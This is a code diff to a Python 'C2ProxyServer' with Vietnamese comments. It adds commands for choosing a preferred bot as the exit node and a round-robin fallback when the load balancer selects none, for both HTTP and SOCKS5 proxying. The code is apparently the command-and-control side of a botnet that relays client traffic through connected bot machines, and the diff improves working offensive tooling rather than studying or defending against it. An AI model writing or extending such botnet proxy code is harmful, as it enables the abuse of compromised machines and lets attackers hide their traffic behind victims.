@@ -46,6 +46,7 @@ class C2ProxyServer:
         
         # Direct forward mode (should be False for real bot relaying)
         self.direct_mode = False
+        self.preferred_bot = None  # Preferred bot for exit node
         
         # Server sockets
         self.c2_socket = None
@@ -461,6 +462,36 @@ class C2ProxyServer:
                 response = json.dumps(connections, default=str, indent=2)
                 client_socket.send(response.encode())
                 
+            elif data.startswith("SELECT_BOT:"):
+                # Chọn bot cụ thể làm exit node mặc định
+                parts = data.split(":")
+                if len(parts) >= 2:
+                    bot_id = parts[1]
+                    if bot_id in self.connected_bots:
+                        self.preferred_bot = bot_id
+                        response = f"✅ Bot {bot_id} selected as preferred exit node"
+                        print(f"🎯 Bot {bot_id} selected as preferred exit node")
+                    else:
+                        response = f"❌ Bot {bot_id} not found"
+                else:
+                    response = "❌ Invalid command format. Use: SELECT_BOT:bot_id"
+                client_socket.send(response.encode())
+                
+            elif data == "CLEAR_PREFERRED_BOT":
+                # Xóa bot ưu tiên, dùng load balancer
+                self.preferred_bot = None
+                response = "✅ Cleared preferred bot, using load balancer"
+                print("🔄 Cleared preferred bot, using load balancer")
+                client_socket.send(response.encode())
+                
+            elif data == "GET_PREFERRED_BOT":
+                # Lấy bot ưu tiên hiện tại
+                response = json.dumps({
+                    'preferred_bot': self.preferred_bot,
+                    'available_bots': list(self.connected_bots.keys())
+                })
+                client_socket.send(response.encode())
+                
         except Exception as e:
             print(f"❌ Error handling client commands: {e}")
         finally:
@@ -495,11 +526,38 @@ class C2ProxyServer:
                 return
             
             # Otherwise choose bot exit node
-            selected_bot = self.load_balancer.select_bot(self.bot_exit_nodes, strategy=self.load_balancing_strategy)
+            # First try preferred bot if set
+            if self.preferred_bot and self.preferred_bot in self.connected_bots:
+                selected_bot = self.preferred_bot
+                print(f"🎯 Using preferred bot: {selected_bot}")
+            else:
+                selected_bot = self.load_balancer.select_bot(self.bot_exit_nodes, strategy=self.load_balancing_strategy)
+                
             if not selected_bot:
-                print(f"❌ No available exit nodes for proxy request from {client_addr}")
-                client_socket.send(b"HTTP/1.1 503 Service Unavailable\r\n\r\n")
-                return
+                # Debug: Show available bots and their status
+                print(f"🔍 DEBUG: No bot selected by load balancer")
+                print(f"   📊 Available bots: {len(self.bot_exit_nodes)}")
+                for bot_id, bot_info in self.bot_exit_nodes.items():
+                    print(f"   🤖 {bot_id}: status={bot_info.get('status', 'unknown')}, health={bot_info.get('health_score', 0)}")
+                
+                # Fallback: Use round-robin from connected bots
+                if self.connected_bots:
+                    bot_ids = list(self.connected_bots.keys())
+                    if bot_ids:
+                        # Simple round-robin using connection count
+                        if not hasattr(self, '_fallback_index'):
+                            self._fallback_index = 0
+                        selected_bot = bot_ids[self._fallback_index % len(bot_ids)]
+                        self._fallback_index += 1
+                        print(f"🔄 Fallback: Using round-robin bot {selected_bot}")
+                    else:
+                        print(f"❌ No available exit nodes for proxy request from {client_addr}")
+                        client_socket.send(b"HTTP/1.1 503 Service Unavailable\r\n\r\n")
+                        return
+                else:
+                    print(f"❌ No available exit nodes for proxy request from {client_addr}")
+                    client_socket.send(b"HTTP/1.1 503 Service Unavailable\r\n\r\n")
+                    return
                 
             print(f"🌐 New proxy request from {client_addr}")
             print(f"   🎯 Target: {target_host}:{target_port} ({'HTTPS' if is_https else 'HTTP'})")
@@ -676,13 +734,42 @@ class C2ProxyServer:
             print(f"   🔗 Connection ID: {connection_id}")
             
             # Chọn bot exit node
-            selected_bot = self.load_balancer.select_bot(self.bot_exit_nodes, strategy=self.load_balancing_strategy)
+            # First try preferred bot if set
+            if self.preferred_bot and self.preferred_bot in self.connected_bots:
+                selected_bot = self.preferred_bot
+                print(f"🎯 Using preferred bot for SOCKS5: {selected_bot}")
+            else:
+                selected_bot = self.load_balancer.select_bot(self.bot_exit_nodes, strategy=self.load_balancing_strategy)
+                
             if not selected_bot:
-                print(f"❌ No available exit nodes for SOCKS5 request from {client_addr}")
-                # Send SOCKS5 error response
-                client_socket.send(b'\x05\x01\x00\x01\x00\x00\x00\x00\x00\x00')
-                client_socket.close()
-                return
+                # Debug: Show available bots and their status
+                print(f"🔍 DEBUG: No bot selected by load balancer for SOCKS5")
+                print(f"   📊 Available bots: {len(self.bot_exit_nodes)}")
+                for bot_id, bot_info in self.bot_exit_nodes.items():
+                    print(f"   🤖 {bot_id}: status={bot_info.get('status', 'unknown')}, health={bot_info.get('health_score', 0)}")
+                
+                # Fallback: Use round-robin from connected bots
+                if self.connected_bots:
+                    bot_ids = list(self.connected_bots.keys())
+                    if bot_ids:
+                        # Simple round-robin using connection count
+                        if not hasattr(self, '_fallback_index'):
+                            self._fallback_index = 0
+                        selected_bot = bot_ids[self._fallback_index % len(bot_ids)]
+                        self._fallback_index += 1
+                        print(f"🔄 Fallback: Using round-robin bot {selected_bot} for SOCKS5")
+                    else:
+                        print(f"❌ No available exit nodes for SOCKS5 request from {client_addr}")
+                        # Send SOCKS5 error response
+                        client_socket.send(b'\x05\x01\x00\x01\x00\x00\x00\x00\x00\x00')
+                        client_socket.close()
+                        return
+                else:
+                    print(f"❌ No available exit nodes for SOCKS5 request from {client_addr}")
+                    # Send SOCKS5 error response
+                    client_socket.send(b'\x05\x01\x00\x01\x00\x00\x00\x00\x00\x00')
+                    client_socket.close()
+                    return
                 
             # Tạo proxy connection
             self.active_proxy_connections[connection_id] = {
